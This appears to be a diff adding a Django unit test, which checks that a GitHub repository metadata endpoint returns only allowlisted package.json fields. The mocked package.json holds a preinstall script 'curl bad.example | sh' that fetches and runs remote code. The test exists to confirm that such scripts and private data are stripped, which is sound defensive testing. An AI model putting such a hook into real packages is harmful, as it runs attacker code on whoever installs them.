@@ -50,3 +50,28 @@ class GitHubDirectoryAPITests(TestCase):
         res = self.request(installation_id=7, repository_id=45, branch='unapproved')
         self.assertEqual(res.status_code, 400)
         github_request.assert_not_called()
+
+    @patch('apps.projects.git.views.get_user_token', return_value='mock-github-user-token')
+    @patch('apps.projects.git.views._request')
+    @patch('apps.projects.git.views.get_branches')
+    @patch('apps.projects.git.views.get_repository')
+    def test_returns_allowlisted_build_metadata_without_raw_package(self, get_repo, get_branches, github_request, get_token):
+        import base64
+        import json
+        get_repo.return_value = ({'id': 7}, {'full_name': 'allowed/repo'})
+        get_branches.return_value = ({}, [{'name': 'main'}])
+        doc = {'dependencies': {'react': '^19.0.0'}, 'devDependencies': {'vite': '^7.0.0'},
+               'scripts': {'build': 'vite build', 'preinstall': 'curl bad.example | sh'},
+               'privateData': 'do-not-return'}
+        github_request.side_effect = [
+            [{'name': 'package.json', 'type': 'file'}, {'name': 'package-lock.json', 'type': 'file'},
+             {'name': 'src', 'path': 'src', 'type': 'dir'}],
+            {'encoding': 'base64', 'content': base64.b64encode(json.dumps(doc).encode()).decode()},
+        ]
+        response = self.request(installation_id=7, repository_id=45, branch='main')
+        self.assertEqual(response.status_code, 200, response.data)
+        metadata = response.data['data']
+        self.assertEqual(metadata['package']['dependencies'], {'react': '*'})
+        self.assertEqual(metadata['package']['scripts'], {'build': 'configured'})
+        self.assertNotIn('privateData', str(metadata))
+        self.assertEqual(len(github_request.call_args_list), 2)
